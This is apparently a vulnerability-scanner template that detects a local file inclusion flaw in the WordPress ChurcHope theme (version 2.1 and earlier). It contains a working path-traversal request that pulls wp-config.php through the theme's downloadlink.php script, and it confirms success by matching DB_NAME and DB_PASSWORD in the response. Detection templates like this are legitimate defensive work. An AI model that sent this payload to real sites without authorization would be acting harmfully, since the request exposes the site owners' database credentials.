id: "churchope-lfi"
name: "WordPress ChurcHope Theme <= 2.1 - Local File Inclusion"
severity: "high"
description: "WordPress ChurcHope Theme <= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which is publicly accessible."
tech:
  - "wordpress"
  - "php"
tags:
  - "wp"
  - "wpscan"
  - "wordpress"
  - "wp-theme"
  - "lfi"
  - "vuln"
cwe: "CWE-23"
reference: "https://wpscan.com/vulnerability/3c5833bd-1fe0-4eba-97aa-7d3a0c8fda15"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
